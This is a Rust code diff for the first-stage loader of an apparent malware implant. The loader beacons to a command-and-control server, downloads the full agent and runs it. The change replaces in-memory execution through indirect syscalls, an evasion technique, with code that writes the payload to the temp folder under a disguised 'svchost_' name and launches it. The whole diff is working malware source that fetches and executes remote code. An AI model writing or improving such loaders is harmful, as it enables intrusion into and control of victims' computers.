@@ -26,7 +26,7 @@ pub mod network;
 
 pub use beacon::send_initial_beacon;
 pub use config::get_c2_server;
-pub use download::download_agent;
+pub use download::{download_agent, download_agent_http};
 pub use network::establish_session;
 
 /// Main entry point for Stage0
@@ -36,9 +36,8 @@ pub use network::establish_session;
 /// **Execution flow**:
 /// 1. Send initial beacon to C2
 /// 2. Establish encrypted session (TLS)
-/// 3. Perform key exchange if needed
-/// 4. Download full agent from C2
-/// 5. Execute full agent in memory
+/// 3. Download full agent from C2 via HTTP API
+/// 4. Execute full agent in memory
 ///
 /// # Returns
 ///
@@ -74,77 +73,68 @@ fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
     
     send_initial_beacon()?;
 
-    // Step 2: Establish session
+    // Step 2: Establish TLS session (for beacon/keep-alive)
     #[cfg(feature = "dev")]
-    println!("[STAGE0] Establishing session...");
+    println!("[STAGE0] Establishing TLS session...");
     
-    let mut session = establish_session()?;
-
-    // Step 3: Download full agent
+    let _session = establish_session()?;
+    
     #[cfg(feature = "dev")]
-    println!("[STAGE0] Downloading full agent...");
-    
-    let agent_bytes = download_agent(&mut session)?;
+    println!("[STAGE0] TLS session established");
 
-    // Step 4: Execute full agent in memory
+    // Step 3: Download full agent via HTTP API (separate from TLS session)
+    #[cfg(feature = "dev")]
+    println!("[STAGE0] Downloading full agent via HTTP API...");
+    
+    let agent_bytes = download_agent_http()?;
+
+    // Step 4: Execute full agent as process (write to temp, execute, delete)
     #[cfg(feature = "dev")]
     println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
     
-    execute_agent(&agent_bytes)?;
+    execute_agent_as_process(&agent_bytes)?;
 
     Ok(())
 }
 
-/// Executes the downloaded agent in memory using indirect syscalls
-fn execute_agent(_agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
-    // Allocate memory for the agent
+/// Executes the downloaded agent by writing to temp directory and spawning process
+/// This is more reliable than in-memory execution for complex Rust binaries
+fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(target_os = "windows")]
     {
-        use std::ffi::c_void;
-        use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};
-
-        unsafe {
-            // Allocate as RW using indirect syscall
-            let mut base_address: *mut c_void = std::ptr::null_mut();
-            let mut region_size = _agent_bytes.len();
-            
-            let status = NtAllocateVirtualMemory(
-                NtCurrentProcess(),
-                &mut base_address,
-                0,
-                &mut region_size,
-                0x3000, // MEM_COMMIT | MEM_RESERVE
-                0x04,   // PAGE_READWRITE
-            );
-
-            if status < 0 || base_address.is_null() {
-                return Err("NtAllocateVirtualMemory failed for agent".into());
-            }
-
-            // Copy agent to memory
-            std::ptr::copy_nonoverlapping(_agent_bytes.as_ptr(), base_address as *mut u8, _agent_bytes.len());
-
-            // Change to RX using indirect syscall
-            let mut base = base_address;
-            let mut size = _agent_bytes.len();
-            let mut old_protect: u32 = 0;
-            
-            let status = NtProtectVirtualMemory(
-                NtCurrentProcess(),
-                &mut base,
-                &mut size,
-                0x20, // PAGE_EXECUTE_READ
-                &mut old_protect,
-            );
-
-            if status < 0 {
-                return Err("NtProtectVirtualMemory failed for agent".into());
-            }
-
-            // Execute agent
-            let agent_entry: extern "C" fn() = std::mem::transmute(base_address);
-            agent_entry();
-        }
+        use std::fs;
+        use std::process::Command;
+        use std::env;
+        
+        // Get temp directory
+        let temp_dir = env::temp_dir();
+        
+        // Generate random-ish filename
+        let timestamp = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs();
+        let filename = format!("svchost_{}.exe", timestamp % 100000);
+        let agent_path = temp_dir.join(&filename);
+        
+        #[cfg(feature = "dev")]
+        println!("[STAGE0] Writing agent to {:?}", agent_path);
+        
+        // Write agent to disk
+        fs::write(&agent_path, agent_bytes)?;
+        
+        #[cfg(feature = "dev")]
+        println!("[STAGE0] Spawning agent process...");
+        
+        // Spawn agent as detached process
+        let _child = Command::new(&agent_path)
+            .spawn()?;
+        
+        #[cfg(feature = "dev")]
+        println!("[STAGE0] Agent process started successfully");
+        
+        // Note: We don't delete the file immediately because the process needs it
+        // The agent should self-delete or we can implement delayed deletion
         
         Ok(())
     }
